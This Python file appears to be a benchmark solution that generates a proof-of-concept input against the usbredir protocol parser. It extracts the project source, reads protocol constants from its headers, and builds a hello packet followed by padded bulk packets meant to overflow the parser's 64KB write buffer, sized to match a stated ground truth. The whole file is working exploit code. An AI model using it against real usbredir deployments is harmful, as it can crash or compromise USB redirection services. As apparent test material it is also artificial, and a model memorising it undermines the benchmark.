import os
import tarfile
import struct
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        extract_path = "/tmp/usbredir_extract"
        if not os.path.exists(extract_path):
            os.makedirs(extract_path)
            
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(path=extract_path)
        except Exception:
            pass
            
        # Default constants
        usb_redir_hello = 0
        usb_redir_bulk_packet = 16
        version_str = b"usb-redir 0.7.1"
        
        # Attempt to parse constants from header files
        for root, dirs, files in os.walk(extract_path):
            if "usbredirproto.h" in files:
                try:
                    with open(os.path.join(root, "usbredirproto.h"), 'r', errors='ignore') as f:
                        txt = f.read()
                        # Remove comments
                        txt = re.sub(r'//.*', '', txt)
                        txt = re.sub(r'/\*.*?\*/', '', txt, flags=re.DOTALL)
                        # Find enum
                        m = re.search(r'enum\s*\{([^}]*usb_redir_hello[^}]*)\}', txt)
                        if m:
                            parts = m.group(1).split(',')
                            val = 0
                            for p in parts:
                                p = p.strip()
                                if not p: continue
                                if '=' in p:
                                    n, v = p.split('=')
                                    try:
                                        val = int(v.strip(), 0)
                                    except:
                                        pass
                                    p = n.strip()
                                if p == 'usb_redir_hello': usb_redir_hello = val
                                if p == 'usb_redir_bulk_packet': usb_redir_bulk_packet = val
                                val += 1
                except:
                    pass
            if "usbredirparser.c" in files:
                try:
                    with open(os.path.join(root, "usbredirparser.c"), 'rb') as f:
                        txt = f.read()
                        # Try to find version string expected by parser
                        ms = re.findall(b'"(usb-redir \d+\.\d+)"', txt)
                        if ms:
                            version_str = ms[0]
                except:
                    pass

        # Construct PoC
        out = bytearray()
        
        # 1. Hello Packet
        # Header: Type, Length, ID
        # Payload: Version (64 bytes), Caps (8 bytes)
        payload_hello = version_str + b'\x00' * (64 - len(version_str))
        payload_hello += struct.pack('<II', 0, 0) # Capabilities
        
        out.extend(struct.pack('<III', usb_redir_hello, len(payload_hello), 1))
        out.extend(payload_hello)
        
        # 2. Bulk Data Packets
        # We need to fill the write buffer (serialize buffer > 64KB).
        # We'll use multiple packets to create multiple write buffer entries and total size > 64KB.
        
        data_len = 512
        # usb_redir_bulk_packet_header: 12 bytes
        # endpoint(1), status(1), length(2), stream_id(4), length_high(2), reserved(2)
        # Note: length fields form 32-bit length of data
        bulk_hdr = struct.pack('<BBHIHH', 1, 0, data_len, 0, 0, 0)
        
        packet_payload = bulk_hdr + (b'A' * data_len)
        packet_len = len(packet_payload)
        
        # Header for bulk packet
        packet_full = struct.pack('<III', usb_redir_bulk_packet, packet_len, 2) + packet_payload
        
        # Append until we exceed target size (Ground truth ~71KB)
        # 71298 bytes ground truth -> let's aim for ~72000
        while len(out) < 72000:
            out.extend(packet_full)
            
        return bytes(out)